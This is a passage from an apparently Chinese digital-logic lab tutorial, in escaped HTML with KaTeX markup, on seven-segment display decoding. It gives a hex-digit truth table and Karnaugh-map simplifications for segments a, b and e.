&lt;p>&lt;img src="https://guahao31.github.io/2024_DD/lab6/pic/opt_segment.png"
loading="lazy"
>&lt;/p>
&lt;p>因此我们可以设计出如下的真值表：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>$X_b$&lt;/th>
&lt;th>$X_h$&lt;/th>
&lt;th>$a$&lt;/th>
&lt;th>$b$&lt;/th>
&lt;th>$c$&lt;/th>
&lt;th>$d$&lt;/th>
&lt;th>$e$&lt;/th>
&lt;th>$f$&lt;/th>
&lt;th>$g$&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0000&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0001&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0010&lt;/td>
&lt;td>2&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0011&lt;/td>
&lt;td>3&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0100&lt;/td>
&lt;td>4&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0101&lt;/td>
&lt;td>5&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0110&lt;/td>
&lt;td>6&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>0111&lt;/td>
&lt;td>7&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1000&lt;/td>
&lt;td>8&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1001&lt;/td>
&lt;td>9&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1010&lt;/td>
&lt;td>A&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1011&lt;/td>
&lt;td>B&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1100&lt;/td>
&lt;td>C&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1101&lt;/td>
&lt;td>D&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1110&lt;/td>
&lt;td>E&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1111&lt;/td>
&lt;td>F&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>如果我们设四位输入信号（16位译码器是 4-16 的） 为 $I_0,I_1,I_2,I_3$ ，那么输出到七个引脚 $a,b,c,d,e,f,g,h$ 的信号可看作是七个关于这四位输入信号的布尔函数。对每个布尔函数我们都可以画出相应的电路图，但是感觉有些复杂，为什么我们不能进行化简呢？正好输入信号就是四位，可以使用 K-map 优化，事情就这样成了，比如 $a,b,e$ 这三个引脚的优化：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/04/17/xDHLev9RVFg6oWa.png"
loading="lazy"
alt="7SD_Kmap.png"
>&lt;/p>
&lt;p>根据卡诺图我们可以得到:&lt;/p>
&lt;p class="katex-block">&lt;span class="katex-display">&lt;span class="katex">&lt;span class="katex-mathml">&lt;math xmlns="http://www.w3.org/1998/Math/MathML" display="block">&lt;semantics>&lt;mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em">&lt;mtr>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mi>a&lt;/mi>&lt;/mstyle>&lt;/mtd>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;mrow>&lt;/mrow>&lt;mo>=&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo>+&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>+&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo>+&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;/mtr>&lt;mtr>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mi>b&lt;/mi>&lt;/mstyle>&lt;/mtd>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;mrow>&lt;/mrow>&lt;mo>=&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo>+&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>+&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo>+&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;/mtr>&lt;mtr>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mi>e&lt;/mi>&lt;/mstyle>&lt;/mtd>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;mrow>&lt;/mrow>&lt;mo>=&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo>+&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>+&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo>⋅&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;/mtr>&lt;/mtable>&lt;annotation encoding="application/x-tex">\begin{aligned}
a &amp;amp;= \overline{I_3} \cdot \overline{I_2} \cdot \overline{I_1} \cdot I_0+ \overline{I_3} \cdot I_2 \cdot \overline{I_1} \cdot \overline{I_0} +I_3 \cdot \overline{I_2} \cdot I_1 \cdot I_0+I_3 \cdot I_2 \cdot \overline{I_1} \cdot I_0\\
b &amp;amp;= \overline{I_3} \cdot I_2 \cdot \overline{I_1} \cdot I_0+I_2 \cdot I_1 \cdot \overline{I_0} +I_3 \cdot I_1 \cdot I_0+I_3 \cdot I_2 \cdot \overline{I_0} \\
e &amp;amp;= \overline{I_3} \cdot I_0+ \overline{I_3} \cdot I_2 \cdot \overline{I_1} + \overline{I_2} \cdot \overline{I_1} \cdot I_0\\
\end{aligned}
&lt;/annotation>&lt;/semantics>&lt;/math>&lt;/span>&lt;span class="katex-html" aria-hidden="true">&lt;span class="base">&lt;span class="strut" style="height:4.63em;vertical-align:-2.065em;">&lt;/span>&lt;span class="mord">&lt;span class="mtable">&lt;span class="col-align-r">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:2.565em;">&lt;span style="top:-4.6817em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal">a&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.1383em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal">b&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-1.595em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal">e&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:2.065em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="col-align-l">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:2.565em;">&lt;span style="top:-4.6817em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">+&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">+&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" 